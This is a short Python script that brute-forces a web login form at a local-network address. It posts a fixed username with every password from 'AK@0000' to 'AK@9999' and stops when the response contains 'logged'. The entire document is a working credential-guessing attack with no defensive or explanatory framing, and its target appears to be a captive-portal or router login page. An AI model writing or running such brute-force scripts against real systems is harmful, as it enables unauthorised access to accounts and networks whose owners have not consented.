import requests

# Target URL
url = "http://192.168.1.1:8090/login.xml"

# Base password prefix
base_password = "AK@"

# Other form data
payload = {
    "mode": "191",
    "username": "Fgg",
    "a": "1738155857532",
    "producttype": "2"
}

# Loop through all four-digit combinations (0000-9999)
for i in range(10000):
    password = f"{base_password}{i:04d}"  # Generates passwords AK@0000 to AK@9999
    payload["password"] = password

    try:
        response = requests.post(url, data=payload)
        response_text = response.text.strip().lower()  # Normalize response text

        print(f"Trying: {password} | Response: {response_text}")

        if "logged" in response_text:
            print(f"\nSuccess! Logged in with password: {password}")
            break  # Stop the loop if "logged" is found

    except requests.exceptions.RequestException as e:
        print(f"Error: {e}")
        break  # Stop on connection error
